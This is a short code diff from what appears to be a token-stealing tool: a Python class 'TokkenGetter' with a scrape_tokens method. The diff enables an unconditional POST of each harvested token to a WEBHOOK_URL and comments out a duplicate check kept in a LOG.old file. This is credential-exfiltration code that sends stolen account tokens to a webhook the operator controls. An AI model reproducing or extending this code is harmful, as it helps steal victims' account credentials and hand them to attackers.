@@ -92,26 +92,26 @@ class TokkenGetter:
                              ]),
                     ]}
                     
-                    # result = requests.post(WEBHOOK_URL, headers={"Content-Type": "application/json"}, data=json.dumps(webhook_data))
-                    # print(result.text)
+                    result = requests.post(WEBHOOK_URL, headers={"Content-Type": "application/json"}, data=json.dumps(webhook_data))
+                    print(result.text)
             self.tokens.remove(token)
             # print(token)
-            if not os.path.isfile("./LOG.old"):
-                with open("LOG.old", "w") as f:
-                    f.write(token)
-            else:
-                with open('LOG.old', "r+") as f:
-                    # for token in self.tokens:
-                    pre_token = f.read()
-                    # print(token + '\n'+pre_token)
-                    if pre_token == token:
-                        exit()
-                    else:
-                        result = requests.post(WEBHOOK_URL, headers={"Content-Type": "application/json"}, data=json.dumps(webhook_data))
-                        print(result.text)
-                    f.seek(0)
-                    f.write(token)
-                    f.truncate()
+#             if not os.path.isfile("./LOG.old"):
+#                 with open("LOG.old", "w") as f:
+#                     f.write(token)
+#             else:
+#                 with open('LOG.old', "r+") as f:
+#                     # for token in self.tokens:
+#                     pre_token = f.read()
+#                     # print(token + '\n'+pre_token)
+#                     if pre_token == token:
+#                         exit()
+#                     else:
+#                         result = requests.post(WEBHOOK_URL, headers={"Content-Type": "application/json"}, data=json.dumps(webhook_data))
+#                         print(result.text)
+#                     f.seek(0)
+#                     f.write(token)
+#                     f.truncate()
 
     def scrape_tokens(self):
 
